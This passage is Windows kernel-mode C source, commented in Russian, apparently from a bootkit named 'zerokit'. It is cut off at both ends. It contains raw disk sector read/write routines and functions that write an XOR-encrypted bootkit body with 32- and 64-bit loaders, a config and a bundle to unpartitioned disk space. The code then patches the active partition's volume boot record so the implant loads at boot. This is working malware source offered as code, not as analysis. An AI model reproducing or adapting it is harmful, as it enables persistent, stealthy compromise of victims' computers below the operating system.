            pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, NotificationEvent, FALSE);

            if (!(pIrp = pGlobalBlock->pCommonBlock->fnIoBuildSynchronousFsdRequest(IRP_MJ_READ, pDiskInfo->pDeviceObject, pTmpBuff, realSize, (LARGE_INTEGER*)&realOffset, &event, &ioStatus))) {
                ntStatus = STATUS_INSUFFICIENT_RESOURCES;
                break;
            }

            irpStack = pIrp->Tail.Overlay.CurrentStackLocation - 1; // IoGetNextIrpStackLocation(pIrp);
            irpStack->Flags |= SL_OVERRIDE_VERIFY_VOLUME;

            ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDiskInfo->pDeviceObject, pIrp);
            if (ntStatus == STATUS_PENDING) {
                pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Suspended, KernelMode, FALSE, NULL);
                ntStatus = ioStatus.Status;
            }
        } while (0);

        if (pTmpBuff != pBuffer) {
            if (ntStatus == STATUS_SUCCESS) {
                pGlobalBlock->pCommonBlock->fnmemcpy(pBuffer, pTmpBuff + diffOffset, size);
            }
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTmpBuff, LOADER_TAG);
        }

        return ntStatus;
}

NTSTATUS common_dio_write_sector(pdisk_info_t pDiskInfo, void* pBuffer, uint32_t size, uint64_t offset)
{
    PIRP pIrp;
    PIO_STACK_LOCATION irpStack;
    NTSTATUS ntStatus = STATUS_INVALID_PARAMETER_2;
    IO_STATUS_BLOCK ioStatus;
    uint64_t realOffset;
    uint32_t realSize;
    uint32_t diffOffset = 0;
    uint8_t* pTmpBuff;
    KEVENT event;
    USE_GLOBAL_BLOCK
        //    uint16_t kratnost = 512;

        if (pDiskInfo->pDeviceObject == NULL) {
            return STATUS_INVALID_PARAMETER_1;
        }

        if (
#ifdef _WIN64
            (offset % pDiskInfo->bytesPerSector)
#else
            pGlobalBlock->pCommonBlock->fn_aullrem(offset, pDiskInfo->bytesPerSector)
#endif // _WIN64
            || (size % pDiskInfo->bytesPerSector)) {
#ifdef _WIN64
                diffOffset = offset % pDiskInfo->bytesPerSector;
#else
                diffOffset = (uint32_t)pGlobalBlock->pCommonBlock->fn_aullrem(offset, pDiskInfo->bytesPerSector);
#endif // _WIN64
                realOffset = offset - diffOffset;
                realSize = size + diffOffset;
#ifdef _WIN64
                realSize = realSize + (pDiskInfo->bytesPerSector - (realSize % pDiskInfo->bytesPerSector));
#else
                realSize = realSize + (pDiskInfo->bytesPerSector - (uint32_t)pGlobalBlock->pCommonBlock->fn_aullrem(realSize, pDiskInfo->bytesPerSector));
#endif // _WIN64
                pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pTmpBuff, realSize, NonPagedPool);
        }
        else {
            realOffset = offset;
            realSize = (uint32_t)size;
            pTmpBuff = (uint8_t*)pBuffer;
        }

        do {
            if (pTmpBuff == NULL) {
                break;
            }

            if (pTmpBuff != pBuffer) {
                pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, NotificationEvent, FALSE);
                if (!(pIrp = pGlobalBlock->pCommonBlock->fnIoBuildSynchronousFsdRequest(IRP_MJ_READ, pDiskInfo->pDeviceObject, pTmpBuff, realSize, (LARGE_INTEGER*)&realOffset, &event, &ioStatus))) {
                    ntStatus = STATUS_INSUFFICIENT_RESOURCES;
                    break;
                }

                irpStack = pIrp->Tail.Overlay.CurrentStackLocation - 1; // IoGetNextIrpStackLocation(pIrp);
                irpStack->Flags |= SL_OVERRIDE_VERIFY_VOLUME;

                ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDiskInfo->pDeviceObject, pIrp);
                if (ntStatus == STATUS_PENDING) {
                    pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Suspended, KernelMode, FALSE, NULL);
                    ntStatus = ioStatus.Status;
                }

                pGlobalBlock->pCommonBlock->fnmemcpy(pTmpBuff + diffOffset, pBuffer, size);
            }

            pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, NotificationEvent, FALSE);
            if (!(pIrp = pGlobalBlock->pCommonBlock->fnIoBuildSynchronousFsdRequest(IRP_MJ_WRITE, pDiskInfo->pDeviceObject, pTmpBuff, realSize, (LARGE_INTEGER*)&realOffset, &event, &ioStatus))) {
                return STATUS_INSUFFICIENT_RESOURCES;
            }

            irpStack = pIrp->Tail.Overlay.CurrentStackLocation - 1; // IoGetNextIrpStackLocation(pIrp);
            irpStack->Flags |= SL_OVERRIDE_VERIFY_VOLUME;

            ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDiskInfo->pDeviceObject, pIrp);
            if (ntStatus == STATUS_PENDING) {
                pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Suspended, KernelMode, FALSE, NULL);
                ntStatus = ioStatus.Status;
            }
        } while(0);

        if (pTmpBuff != pBuffer) {
            if (ntStatus == STATUS_SUCCESS) {
                pGlobalBlock->pCommonBlock->fnmemcpy(pBuffer, pTmpBuff + diffOffset, size);
            }
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTmpBuff, LOADER_TAG);
        }

        return ntStatus;
}

#include <scsi.h>

NTSTATUS common_dio_rw_completion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN void* Context)
{
    USE_GLOBAL_BLOCK
    //
    // First set the status and information fields in the io status block
    // provided by the caller.
    //

    *(Irp->UserIosb) = Irp->IoStatus;

    //
    // Unlock the pages for the data buffer.
    //

    if (Irp->MdlAddress) {
        pGlobalBlock->pCommonBlock->fnMmUnlockPages(Irp->MdlAddress);
        pGlobalBlock->pCommonBlock->fnIoFreeMdl(Irp->MdlAddress);
    }

    //
    // Signal the caller's event.
    //

    pGlobalBlock->pCommonBlock->fnKeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, FALSE);

    //
    // Free the MDL and the IRP.
    //
//pGlobalBlock->pCommonBlock->fn
    pGlobalBlock->pCommonBlock->fnIoFreeIrp(Irp);

    return STATUS_MORE_PROCESSING_REQUIRED;
} // end ClasspSendSynchronousCompletion()

// NTSTATUS common_dio_rw_sector(pdisk_info_t pDiskInfo, uint32_t mode, void* pBuffer, uint32_t size, UINT64 offset)
// {
//     PIRP pIrp;
//     PIO_STACK_LOCATION irpStack;
//     NTSTATUS ntStatus;
//     IO_STATUS_BLOCK ioStatus;
//     PSCSI_REQUEST_BLOCK pSrb = NULL;
//     PCDB pCdb;
//     PSENSE_DATA pSenseData = NULL;
//     KEVENT event;
//     LARGE_INTEGER logicalBlockAddr;
//     ulong_t numTransferBlocks;
//     USE_GLOBAL_BLOCK
// 
//     if (pDiskInfo->pLowerDevice == NULL) {
//         return STATUS_INVALID_PARAMETER_1;
//     }
// 
//     logicalBlockAddr.QuadPart = Int64ShrlMod32(offset, 9);
//     numTransferBlocks = size >> 9;
// 
//     pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&event, NotificationEvent, FALSE);
// 
//     pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pSrb, sizeof(SCSI_REQUEST_BLOCK), NonPagedPool);
//     pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pSenseData, SENSE_BUFFER_SIZE, NonPagedPoolCacheAligned);
//     pGlobalBlock->pCommonBlock->fnmemset(pSrb, 0, sizeof(SCSI_REQUEST_BLOCK));
//     pGlobalBlock->pCommonBlock->fnmemset(pSenseData, 0, sizeof(SENSE_DATA));
// 
//     pSrb->Length = sizeof(SCSI_REQUEST_BLOCK);
// 
//     pSrb->Lun = pDiskInfo->scsiAddress.Lun;
//     pSrb->PathId = pDiskInfo->scsiAddress.PathId;
//     pSrb->TargetId = pDiskInfo->scsiAddress.TargetId;
// 
//     pSrb->Function = SRB_FUNCTION_EXECUTE_SCSI;
//     pSrb->DataBuffer = pBuffer;
//     pSrb->DataTransferLength = size;
//     pSrb->QueueAction = SRB_SIMPLE_TAG_REQUEST;
//     pSrb->SenseInfoBuffer = pSenseData;
//     pSrb->SenseInfoBufferLength = SENSE_BUFFER_SIZE;
//     pSrb->SrbFlags |= 0x20u;
//     pSrb->TimeOutValue = 3;//(pSrb->DataTransferLength >> 10) + 1;
//     pSrb->CdbLength = 10;
// 
//     //             //
//     //             // Standard 10-byte CDB
//     // 
//     //             struct _CDB10 {
//     //                 UCHAR OperationCode;
//     //                 UCHAR RelativeAddress : 1;
//     //                 UCHAR Reserved1 : 2;
//     //                 UCHAR ForceUnitAccess : 1;
//     //                 UCHAR DisablePageOut : 1;
//     //                 UCHAR LogicalUnitNumber : 3;
//     //                 UCHAR LogicalBlockByte0;
//     //                 UCHAR LogicalBlockByte1;
//     //                 UCHAR LogicalBlockByte2;
//     //                 UCHAR LogicalBlockByte3;
//     //                 UCHAR Reserved2;
//     //                 UCHAR TransferBlocksMsb;
//     //                 UCHAR TransferBlocksLsb;
//     //                 UCHAR Control;
//     //             } CDB10;
// 
//     pCdb = (PCDB)pSrb->Cdb;
//     if (mode == IRP_MJ_READ) {
//         pSrb->SrbFlags = SRB_FLAGS_ADAPTER_CACHE_ENABLE | SRB_FLAGS_DATA_IN;
//         pCdb->CDB10.OperationCode = SCSIOP_READ;
//     }
//     else {
//         pSrb->SrbFlags = SRB_FLAGS_DATA_OUT;
//         pCdb->CDB10.OperationCode = SCSIOP_WRITE;
//     }
// 
//     pCdb->CDB10.LogicalBlockByte0 = ((PFOUR_BYTE)&logicalBlockAddr.LowPart)->Byte3;
//     pCdb->CDB10.LogicalBlockByte1 = ((PFOUR_BYTE)&logicalBlockAddr.LowPart)->Byte2;
//     pCdb->CDB10.LogicalBlockByte2 = ((PFOUR_BYTE)&logicalBlockAddr.LowPart)->Byte1;
//     pCdb->CDB10.LogicalBlockByte3 = ((PFOUR_BYTE)&logicalBlockAddr.LowPart)->Byte0;
//     pCdb->CDB10.TransferBlocksMsb = ((PFOUR_BYTE)&numTransferBlocks)->Byte1;
//     pCdb->CDB10.TransferBlocksLsb = ((PFOUR_BYTE)&numTransferBlocks)->Byte0;
//     pSrb->Cdb[1] = pSrb->Cdb[1] & 0x1F | 32 * pSrb->Lun;
// 
//     pIrp = pGlobalBlock->pCommonBlock->fnIoAllocateIrp(pDiskInfo->pLowerDevice->StackSize, FALSE);
//     if (pIrp != NULL) {
//         pSrb->OriginalRequest = pIrp;
//         pIrp->MdlAddress = pGlobalBlock->pCommonBlock->fnIoAllocateMdl(pBuffer, size, FALSE, FALSE, pIrp);
//         if (pIrp->MdlAddress) {
//             pGlobalBlock->pCommonBlock->fnMmProbeAndLockPages(pIrp->MdlAddress, KernelMode, (mode == IRP_MJ_READ ? IoReadAccess : IoWriteAccess));
//             //MmProbeAndLockPages(v27, 0, 0);
// 
//             pIrp->IoStatus.Status = 0;
//             pIrp->IoStatus.Information = 0;
//             pIrp->Flags = 5;
//             pIrp->AssociatedIrp.MasterIrp = 0;
//             pIrp->Cancel = 0;
//             pIrp->RequestorMode = 0;
//             pIrp->CancelRoutine = 0;
//             pIrp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
//             pIrp->UserIosb = &ioStatus;
//             pIrp->UserEvent = &event;
// 
//             irpStack = pIrp->Tail.Overlay.CurrentStackLocation - 1;
//             irpStack->MajorFunction = IRP_MJ_SCSI;
//             irpStack->Parameters.Scsi.Srb = pSrb;
//             irpStack->CompletionRoutine = pGlobalBlock->pCommonBlock->fncommon_dio_rw_completion;
//             irpStack->Context = pSrb;
//             irpStack->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;
//             irpStack->DeviceObject = pDiskInfo->pLowerDevice;
// 
//             ntStatus = pGlobalBlock->pCommonBlock->fnIofCallDriver(pDiskInfo->pLowerDevice, pIrp);
// 
//             if (ntStatus == STATUS_PENDING) {
//                 pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
//                 ntStatus = ioStatus.Status;
//             }
// 
//             pSrb->SenseInfoBuffer = NULL;
//             pSrb->SenseInfoBufferLength = 0;
//         }
//     }
//     pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pSrb, 0);
//     pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pSenseData, 0);
// 
//     return ntStatus;
// }


uint64_t common_dio_get_disk_size(pdisk_info_t pDiskInfo, int precision)
{
    DISK_GEOMETRY_EX dgx;
    uint64_t mid, size  = 0;
    uint64_t high, low;
    uint64_t bps, pos;
    uint8_t* buff;
    USE_GLOBAL_BLOCK

        do {
            if (pDiskInfo->pDeviceObject == NULL) {
                break;
            }

            if (pGlobalBlock->pCommonBlock->fncommon_dio_get_volume_info(pDiskInfo->pDeviceObject, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, (uint8_t*)&dgx, sizeof(dgx)) == STATUS_SUCCESS) {
                size = dgx.DiskSize.QuadPart;
                break;
            }

            bps = (uint64_t)pDiskInfo->bytesPerSector;
#ifdef _WIN64
            high = (((uint64_t)pDiskInfo->sectorsPerCyl * bps) + pDiskInfo->totalSectors) / bps;
            low = pDiskInfo->totalSectors / bps;
#else
            high = pGlobalBlock->pCommonBlock->fn_alldiv(pGlobalBlock->pCommonBlock->fn_allmul((uint64_t)pDiskInfo->sectorsPerCyl, bps) + pDiskInfo->totalSectors, bps);
            low = pGlobalBlock->pCommonBlock->fn_alldiv(pDiskInfo->totalSectors, bps);
#endif // _WIN64
            size = pDiskInfo->totalSectors;

            /* binary search disk space in hidden cylinder */
            if (precision != 0) {
                pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &buff, pDiskInfo->bytesPerSector, NonPagedPool);
                do {
#ifdef _WIN64
                    mid = (high + low) / 2;
                    pos = mid * bps;
#else
                    mid = pGlobalBlock->pCommonBlock->fn_alldiv(high + low, 2);
                    pos = pGlobalBlock->pCommonBlock->fn_allmul(mid, bps);
#endif // _WIN64

                    if (pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pDiskInfo, buff, pDiskInfo->bytesPerSector, pos) == STATUS_SUCCESS) {
                        low = mid + 1;
                    }
                    else {
                        high = mid - 1;
                    }

                    if (high <= low) {
#ifdef _WIN64
                        size = low * bps;
#else
                        size = pGlobalBlock->pCommonBlock->fn_allmul(low, bps);
#endif // _WIN64
                        break;
                    }
                } while (1);

                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(buff, LOADER_TAG);
            }
        } while (0);

    return size;
}

#define FS_FAT12_HASH 0x4a416851
#define FS_FAT16_HASH 0x4a416853
#define FS_FAT32_HASH 0x4a616851
#define FS_NTFS_HASH 0x0ea14c4d
#define FS_EXFAT_HASH 0x0d394c78

NTSTATUS common_dio_update_bootkit(uint8_t* pPayload, bool_t atBegin, pbk_mbr_t pMbr, pbk_ntfs_vbr_t pActiveVBR, ppartition_table_entry_t pActivePartEntry, pvoid_t pParam)
{
    NTSTATUS ntStatus;
    pzerokit_header_t pRealPayloadHeader, pPayloadHeader = (pzerokit_header_t)(pPayload + 1024 + 2);
    pdisk_info_t pDiskInfo;
    uint64_t diskSize;
    uint64_t max_end;
    uint64_t min_str;
    uint64_t bkBodyOffset;
    ppartition_table_entry_t pPartEntry;
    uint8_t* pRealData = NULL;
    uint8_t* pNewData = NULL;
    uint8_t* tmpBuff;
    uint32_t realSize, i, bkSize, ldr32Size, ldr64Size, configSize, bundleSize;
    pmods_pack_header_t pMods32Hdr, pMods64Hdr;
    ploader32_info_t pLdr32Info;
    ploader64_info_t pLdr64Info;
    pmod_header_t pModHeader;
    uint16_t bkPadSize;
    uint16_t bkKeyOffset;
    pbios_dap_t pOrigVbrDap;
    USE_GLOBAL_BLOCK
   
    pDiskInfo = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    do {
        if (pDiskInfo->bytesPerSector % SECTOR_SIZE != 0) {
            break;
        }

        if (pPayload != NULL) {
            if (pPayloadHeader->sizeOfBootkit <= pDiskInfo->bytesPerSector) {
                break;
            }

            pMods32Hdr = (pmods_pack_header_t)(pPayload + pPayloadHeader->sizeOfBootkit);
            pMods64Hdr = (pmods_pack_header_t)((uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t) + pMods32Hdr->sizeOfPack);

            // Выравниваем размеры  компонентов зерокита до кратности размеру сектора.
            bkSize = pPayloadHeader->sizeOfBootkit - 4;
            ldr32Size = _ALIGN(pMods32Hdr->sizeOfPack, pDiskInfo->bytesPerSector);
            ldr64Size = _ALIGN(pMods64Hdr->sizeOfPack, pDiskInfo->bytesPerSector);
            configSize = _ALIGN(pPayloadHeader->sizeOfConfig, pDiskInfo->bytesPerSector);
            bundleSize = _ALIGN(pPayloadHeader->sizeOfBundle, pDiskInfo->bytesPerSector);
            realSize = bkSize + ldr32Size + ldr64Size + configSize + bundleSize;
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pNewData, 512 + realSize, NonPagedPool);
            pRealData = pNewData + 512;

            bkPadSize = *(uint16_t*)(pPayload + bkSize);
            bkKeyOffset = *(uint16_t*)(pPayload + bkSize + 2);

            // Копируем буткит.
            pGlobalBlock->pCommonBlock->fnmemcpy(pRealData, pPayload, bkSize);

            pLdr32Info = (ploader32_info_t)(pRealData + bkSize - bkPadSize - pPayloadHeader->sizeOfBkPayload64 - sizeof(loader32_info_t));
            pGlobalBlock->pCommonBlock->fnmemset(pLdr32Info, 0, sizeof(loader32_info_t));
            pLdr64Info = (ploader64_info_t)(pRealData + bkSize - bkPadSize - sizeof(loader64_info_t));
            pGlobalBlock->pCommonBlock->fnmemset(pLdr64Info, 0, sizeof(loader64_info_t));

            // Копируем 32-битную часть.
            pModHeader = (pmod_header_t)(pRealData + bkSize);
            pGlobalBlock->pCommonBlock->fnmemcpy(pModHeader, (uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t), pMods32Hdr->sizeOfPack);
            // Для mod_common записываем в поле reserved1 смещение до конфигурационной области в памяти, а в поле reserved2 её размер.
            pModHeader->confOffset = ldr32Size + ldr64Size;
            pModHeader->confSize = configSize;

            // Копируем 64-битную часть.
            pModHeader = (pmod_header_t)(pRealData + bkSize + ldr32Size);
            pGlobalBlock->pCommonBlock->fnmemcpy(pModHeader, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t), pMods64Hdr->sizeOfPack);
            // Для mod_common записываем в поле reserved1 смещение до конфигурационной области в памяти, а в поле reserved2 её размер.
            pModHeader->confOffset = ldr64Size;
            pModHeader->confSize = configSize;

            // Копируем конфигурационный блок.
            pGlobalBlock->pCommonBlock->fnmemcpy(pRealData + bkSize + ldr32Size + ldr64Size, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack, pPayloadHeader->sizeOfConfig);
            
            // Копируем бандл.
            pGlobalBlock->pCommonBlock->fnmemcpy(pRealData + bkSize + ldr32Size + ldr64Size + configSize, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack + pPayloadHeader->sizeOfConfig, pPayloadHeader->sizeOfBundle);

            pLdr32Info->loaderSize = ldr32Size/* + ldr64Size + configSize*/;
            pLdr64Info->loaderSize = ldr64Size/* + configSize*/;

            pRealPayloadHeader = (pzerokit_header_t)(pRealData + 1024 + 2);
            pGlobalBlock->pCommonBlock->fnmemcpy(pRealPayloadHeader, pPayloadHeader, sizeof(zerokit_header_t));
            pRealPayloadHeader->sizeOfBootkit = bkSize;
            pRealPayloadHeader->sizeOfPack = realSize - configSize - bundleSize + 512;
            pRealPayloadHeader->sizeOfConfig = configSize;
            pRealPayloadHeader->sizeOfBundle = bundleSize;

            // Получаем размер диска.
            if ((diskSize = pGlobalBlock->pCommonBlock->fncommon_dio_get_disk_size(pDiskInfo, 1)) == 0) {
                ntStatus = STATUS_IO_DEVICE_ERROR;
                break;
            }

            tmpBuff = (uint8_t*)pMbr;

            if ((pMbr->magic != 0xAA55) ||
                pGlobalBlock->pCommonBlock->fncommon_calc_hash(tmpBuff + 3, 8) == FS_NTFS_HASH ||
                pGlobalBlock->pCommonBlock->fncommon_calc_hash(tmpBuff + 54, 8) == FS_FAT12_HASH ||
                pGlobalBlock->pCommonBlock->fncommon_calc_hash(tmpBuff + 54, 8) == FS_FAT16_HASH ||
                pGlobalBlock->pCommonBlock->fncommon_calc_hash(tmpBuff + 82, 8) == FS_FAT32_HASH ||
                pGlobalBlock->pCommonBlock->fncommon_calc_hash(tmpBuff + 3, 8) == FS_EXFAT_HASH) {
                ntStatus = STATUS_BAD_MASTER_BOOT_RECORD;
                break;
            }

            // Ищем свободное место перед разделом и после.
            min_str = 64;
            max_end = 0;
            for (i = 0, max_end = 0; i < 4; ++i)  {
                if ((pPartEntry = &pMbr->pt[i])->totalSects == 0) { // пропускаем пустые разделы
                    continue;
                }

                min_str = min(min_str, pPartEntry->startSect);
                max_end = max(max_end, pPartEntry->startSect + pPartEntry->totalSects);
            }
    #ifdef _WIN64
            max_end *= (uint64_t)pDiskInfo->bytesPerSector;
            min_str *= (uint64_t)pDiskInfo->bytesPerSector;
    #else
            max_end = pGlobalBlock->pCommonBlock->fn_allmul(max_end, (uint64_t)pDiskInfo->bytesPerSector);
            min_str = pGlobalBlock->pCommonBlock->fn_allmul(min_str, (uint64_t)pDiskInfo->bytesPerSector);
    #endif // _WIN64

            if (atBegin) {
                if (min_str < realSize + pDiskInfo->bytesPerSector) {
                    ntStatus = STATUS_DISK_FULL;
                    break;
                }
                bkBodyOffset = pDiskInfo->bytesPerSector;        
            }
            else {
                bkBodyOffset = diskSize - realSize - (FREE_SPACE_AFTER * pDiskInfo->bytesPerSector); // Записываем тело буткита с конца и оставляем 11 секторов.

                if (max_end > bkBodyOffset) {
                    ntStatus = STATUS_DISK_FULL;
                    break;
                }
            }

            if (pActivePartEntry == NULL) {
                ntStatus = STATUS_UNSUCCESSFUL;
                break;
            }

            // Сохраняем оригинальный VBR.
            MEMCPY(pNewData, pActiveVBR, sizeof(bk_ntfs_vbr_t));

            pLdr32Info->loaderOffset = bkBodyOffset + 512 + bkSize; // Смещение до 32-битной версии зерокита.
            pLdr64Info->loaderOffset = pLdr32Info->loaderOffset + ldr32Size; // Смещение до 64-битной версии зерокита.
    #ifdef _WIN64
            pActiveVBR->bpb.hiddenSectors = pLdr32Info->startSector = pLdr64Info->startSector = (uint32_t)(bkBodyOffset / pDiskInfo->bytesPerSector); // Номер сектора откуда начинается тело буткита.
    #else
            pActiveVBR->bpb.hiddenSectors = pLdr32Info->startSector = pLdr64Info->startSector = (uint32_t)pGlobalBlock->pCommonBlock->fn_alldiv(bkBodyOffset, pDiskInfo->bytesPerSector); // Номер сектора откуда начинается тело буткита.
    #endif // _WIN64

            //         if (*((uint64_t*)pActiveVBR->oemName) == 0x202020205346544EULL) { // NTFS VBR
            // 
            //         }
            //         else
            if (*((uint64_t*)pActiveVBR->oemName) == 0x302E35534F44534DULL) { // FAT32 VBR
                pActiveVBR->bpb.hiddenSectors -= 0x0C - 2; // запуск в FAT32 сразу с нужного сектора.
            }

            // Смещение до оригинального загрузочного VBR.
            pOrigVbrDap = (pbios_dap_t)(pRealData + 512 + 2);
            *((uint32_t*)&pOrigVbrDap->sector) = pActivePartEntry->startSect;
            // Смещение до тела буткита.
            ++pOrigVbrDap;
            *((uint32_t*)&pOrigVbrDap->sector) = pLdr32Info->startSector;

            // Подсчитываем hash и шифруем буткит, начиная с 512 байта.
            {
                uint32_t crcVal = 0;
                uint8_t* itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t);
                uint8_t* end = pRealData + bkSize - 4;
                uint8_t* zbkKeyItr = pPayload + bkKeyOffset - 512;
                uint8_t* keyItr = zbkKeyItr;

                for ( ; itr < end; ++itr) {
                    crcVal = (crcVal << 7) | (crcVal >> (32 - 7)); // rol(crcVal, 7);
                    *((uint8_t*)&crcVal) ^= *itr;
                }

                *((uint32_t*)itr) = crcVal;

                end += 4;
                for (itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t); itr < end; ++itr) {
                    *itr ^= *keyItr;

                    ++keyItr;
                    if ((keyItr - zbkKeyItr) >= 64) {
                        keyItr = zbkKeyItr;
                    }
                }
            }

            // Записываем тело буткита.
            if ((ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_write_sector(pDiskInfo, pNewData, 512 + realSize, bkBodyOffset)) != STATUS_SUCCESS) {
                break;
            }
        }
        else if (pParam != NULL) {
#ifdef _WIN64
            bkBodyOffset = (uint64_t)((uint32_t)pParam) * pDiskInfo->bytesPerSector;
#else
            bkBodyOffset = pGlobalBlock->pCommonBlock->fn_allmul(((uint32_t)pParam), pDiskInfo->bytesPerSector);
#endif // _WIN64
            pActiveVBR->bpb.hiddenSectors = (uint32_t)pParam;
        }
        else {
            ntStatus = STATUS_UNSUCCESSFUL;
            break;
        }

        pGlobalBlock->pCommonBlock->bodySecOffset = bkBodyOffset;

#ifdef _WIN64
        bkBodyOffset = (uint64_t)pActivePartEntry->startSect * pDiskInfo->bytesPerSector;
#else
        bkBodyOffset = pGlobalBlock->pCommonBlock->fn_allmul(pActivePartEntry->startSect, pDiskInfo->bytesPerSector);
#endif // _WIN64

        // Записываем модифицированный VBR.
        if ((ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_write_sector(pDiskInfo, pActiveVBR, sizeof(bk_ntfs_vbr_t), bkBodyOffset)) != STATUS_SUCCESS) {
            break;
        }
    } while (0);

    if (pNewData != NULL) {
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pNewData, LOADER_TAG);
    }

    return ntStatus;
}

bool_t common_update(uint8_t* pZkBuffer, pvoid_t pParam)
{
    NTSTATUS ntStatus;
    int i;
    bool_t installed = TRUE;
    pdisk_info_t pDiskInfo;
    bk_mbr_t mbr;    
    pbk_mbr_t pMbr;
    bk_ntfs_vbr_t ntfsVBR;
    pbk_ntfs_vbr_t pActiveVBR;
    uint64_t secOffset;
    ppartition_table_entry_t pPartEntry;
    ppartition_table_entry_t pActivePartEntry = NULL;
    USE_GLOBAL_BLOCK

    pDiskInfo  = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    if (pDiskInfo == NULL) {
        return FALSE;
    }

    if (pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pDiskInfo, &mbr, sizeof(mbr), 0) != STATUS_SUCCESS) {
        return FALSE;
    }

    // Ищем активный раздел
    for (i = 0; i < 4; ++i)  {
        if ((pPartEntry = &mbr.pt[i])->totalSects == 0) { // пропускаем пустые разделы
            continue;
        }

        if (pPartEntry->active == 0x80) {
            pActivePartEntry = pPartEntry;
            break;
        }
    }

    if (pActivePartEntry == NULL) {
        return FALSE;
    }

    // Вычисляем смещение до сектора, где находится сектор активного тома.
#ifdef _WIN64
    secOffset = (uint64_t)pActivePartEntry->startSect * pDiskInfo->bytesPerSector;
#else
    secOffset = pGlobalBlock->pCommonBlock->fn_allmul(pActivePartEntry->startSect, pDiskInfo->bytesPerSector);
#endif // _WIN64

    // Загружаем VBR.
    if (pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), secOffset) != STATUS_SUCCESS) {
        return FALSE;
    }

    pGlobalBlock->pCommonBlock->activeVBROffset = secOffset;

    if (pParam != NULL) {
        // Случай, обновления. Необходимо считать реальный VBR.
#ifdef _WIN64
        secOffset = (uint64_t)ntfsVBR.bpb.hiddenSectors * pDiskInfo->bytesPerSector;
#else
        secOffset = pGlobalBlock->pCommonBlock->fn_allmul(ntfsVBR.bpb.hiddenSectors, pDiskInfo->bytesPerSector);
#endif // _WIN64

        if (*((uint64_t*)ntfsVBR.oemName) == 0x302E35534F44534DULL) { // FAT32 VBR
            secOffset += 0x0C;
        }

        // Загружаем реальный VBR.
        if (pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), secOffset) != STATUS_SUCCESS) {
            return FALSE;
        }
    }

    pMbr = &mbr;
    pActiveVBR = &ntfsVBR;

    __movsb(pGlobalBlock->pCommonBlock->activeVBR, (uint8_t*)pActiveVBR, sizeof(pGlobalBlock->pCommonBlock->activeVBR));

    ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_update_bootkit(pZkBuffer, 0, pMbr, pActiveVBR, pActivePartEntry, pParam);
    if (ntStatus == STATUS_DISK_FULL) {
        if (pGlobalBlock->pCommonBlock->fncommon_dio_update_bootkit(pZkBuffer, 1, pMbr, pActiveVBR, pActivePartEntry, pParam) != STATUS_SUCCESS) {
            installed = FALSE;
        }
    }
    else if (ntStatus != STATUS_SUCCESS) {
        installed = FALSE;
    }

    if (installed) {
        // Читаем сектор, где находится структура pzerokit_header_t.
        if ((ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_read_sector(pDiskInfo, &mbr, sizeof(mbr), pGlobalBlock->pCommonBlock->bodySecOffset + pDiskInfo->bytesPerSector * 3)) == STATUS_SUCCESS) {
            pGlobalBlock->pCommonBlock->fnmemcpy(&pGlobalBlock->pCommonBlock->zerokitHeader, (uint8_t*)(&mbr) + 2, sizeof(zerokit_header_t));
        }
    }
    return installed;
}

uint32_t common_get_system_time()
{
    LARGE_INTEGER systemTm, localTm;
    uint32_t unixTime = 0;
    USE_GLOBAL_BLOCK

#ifdef _WIN64
        KeQuerySystemTime(&systemTm);
#else
        pGlobalBlock->pCommonBlock->fnKeQuerySystemTime(&systemTm);
#endif // _WIN64
    pGlobalBlock->pCommonBlock->fnExSystemTimeToLocalTime(&systemTm, &localTm);
    pGlobalBlock->pCommonBlock->fnRtlTimeToSecondsSince1970(&localTm, (PULONG)&unixTime);

    return unixTime;
}

const char* common_get_base_name(const char* fullName, uint32_t* pSize)
{
